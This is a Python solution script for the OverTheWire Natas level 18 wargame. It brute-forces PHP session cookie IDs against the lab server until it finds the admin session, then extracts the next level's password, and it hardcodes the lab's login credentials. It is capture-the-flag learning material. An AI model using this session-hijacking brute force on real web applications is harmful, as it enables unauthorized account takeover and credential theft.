#!/bin/env python3
'''
In this one we're trying to figure out which session holds the admin creds.
To do this we're going to iterate over every possible session until we find
one that's got admin rights.

It's basically a session hijacking.
'''
import requests
import re
import time
#quick function to calculate the total time taken.
def time_taken(start):
	return round(time.time() - start,2)
user='natas18'
password='xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
url='http://natas18.natas.labs.overthewire.org/index.php?debug=1'
#Create the login object
login=requests.auth.HTTPBasicAuth(user,password)
#Our regex pattern. Since the username and password are wrapped in <pre></pre> then we match everything within it.
#Also I'm telling it to be multi-lined. Furthermore I'm making sure that dot also matches new lines.
pattern=re.compile("(?<=\<pre\>)(.*.)(?=<\/pre\>)",flags=re.M | re.S)
#we start the the timer because we're about to do the loop.
start=time.time()
#making sure that it's got debug set.
i=1
for i in range(1,641):
	#evertime we are at a multiple of 64 then we're at least 10% done.
	if i % 64 == 0:
		#print out how much we've went through.
		print('{}% done.'.format((i//64)*10))
		print("It's taken {0}s so far.".format(time_taken(start)))
		
	#set our cookie to the PHPSESSID because that's the one they use.
	cookies={'PHPSESSID':str(i)}
	#get our reqeust done.
	response=requests.get(url,auth=login,cookies=cookies)
	#check to see if this text was in it because this means
	#that we have found the correct session id.

	if 'Username: natas19' in response.text:
		#Tell the user what session we were at.
		print("Session ID was {}".format(i))
		#get the concent within the html tag that only has the userame
		#and the password.
		matched=pattern.findall(response.content.decode('UTF-8'))
		#print that matched object there'll only be one.
		#since it returns a list we need to get the first object 
		#and then rpint it.
		print(matched[0])
		#break out of the loop because we're done.
		break
	i+=1
#going to go through the whole 640 iterations.
print('\nIn total it took {0}s'.format(time_taken(start)))
